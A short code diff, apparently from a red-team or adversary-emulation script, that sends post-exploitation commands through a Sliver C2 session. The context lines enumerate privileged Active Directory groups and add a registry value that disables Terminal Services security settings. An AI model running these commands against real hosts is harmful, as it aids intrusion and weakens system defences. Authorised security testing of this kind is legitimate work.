@@ -70,7 +70,7 @@ async def main():
     user_params["SessionID"] = sliver_sessionid
 
     confirm_action()
-    commands = """
+    commands = f"""
     net groups "Account Operators" /doma
     net groups "Exchange Organization Management" /doma
     net group "BUILTIN\Backup Operators" /doma
@@ -286,7 +286,7 @@ async def main():
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = f"""
     reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
